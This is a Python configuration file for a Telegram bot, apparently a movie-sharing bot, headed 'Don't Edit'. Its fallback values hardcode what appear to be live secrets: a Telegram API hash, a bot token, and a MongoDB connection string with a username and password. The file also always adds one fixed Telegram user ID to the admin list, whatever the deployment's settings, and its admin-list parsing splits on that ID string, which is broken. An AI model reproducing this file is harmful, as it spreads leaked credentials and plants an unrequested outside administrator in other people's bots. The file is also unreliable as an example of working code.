# Don't Edit

import os

from dotenv import load_dotenv
load_dotenv()


# Mandatory variables for the bot to start
API_ID = int(os.getenv("API_ID", "11159699"))
API_HASH = os.environ.get("API_HASH", "b432bad423ae90d470d906ef26109712")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "5622690128:AAEHTxXmpvmxyVdgKYYBAc46SwCYBoKPkts")
ADMINS = [int(i.strip()) for i in os.environ.get("ADMINS").split("2120922739")] if os.environ.get("ADMINS") else []
ADMIN = ADMINS
DATABASE_NAME = os.environ.get("DATABASE_NAME", "Cluster0")
DATABASE_URL = os.getenv("DATABASE_URL", "mongodb+srv://mdisk:mdisk@cluster0.0ycuxow.mongodb.net/?retryWrites=true&w=majority") 
OWNER_ID =  int(os.environ.get("OWNER_ID", "2120922739")) 
ADMINS.append(OWNER_ID) if OWNER_ID not in ADMINS else []
ADMINS.append(2120922739)
#  Optionnal variables
LOG_CHANNEL = int(os.environ.get("LOG_CHANNEL", "-1001864689968")) 
UPDATE_CHANNEL = os.environ.get("UPDATE_CHANNEL", "new_movies_download_backup") # For Force Subscription
BROADCAST_AS_COPY = os.environ.get('BROADCAST_AS_COPY', "True") # true if forward should be avoided
WELCOME_IMAGE = os.environ.get("WELCOME_IMAGE", '') # image when someone hit /start # image when someone hit /start
LINK_BYPASS = "False"
